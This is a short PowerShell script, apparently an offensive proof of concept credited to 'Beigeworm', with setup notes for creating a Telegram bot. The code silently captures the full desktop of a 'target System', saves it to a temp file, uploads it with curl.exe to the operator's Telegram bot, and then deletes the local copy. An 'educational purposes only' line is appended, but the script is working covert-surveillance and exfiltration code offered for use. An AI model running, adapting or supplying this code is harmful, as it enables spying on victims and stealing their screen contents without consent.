<#
============================================= Beigeworm's Telegram Screenshot ========================================================

SYNOPSIS
This script uses powershell to take a screenshot of the desktop and send it to a telegram bot.

SETUP INSTRUCTIONS
1. visit https://t.me/botfather and make a bot.
2. add bot api to script.
3. search for bot in top left box in telegram and start a chat then type /start.
4. add chat ID for the chat bot (use this below to find the chat id) 

---------------------------------------------------
$Token = "Token_Here" # Your Telegram Bot Token 
$url = 'https://api.telegram.org/bot{0}' -f $Token
$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
-----------------------------------------------------

5. Run Script on target System

THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
#>
#------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
$Token = "TOKEN_HERE"  # Your Telegram Token
$ChatID = "CHAT_ID_HERE"   # Your Chat ID (see above for setup)
$URL='https://api.telegram.org/bot{0}' -f $Token 

Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
$filePath = "$env:temp\sc.png"
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
Remove-Item -Path $filePath

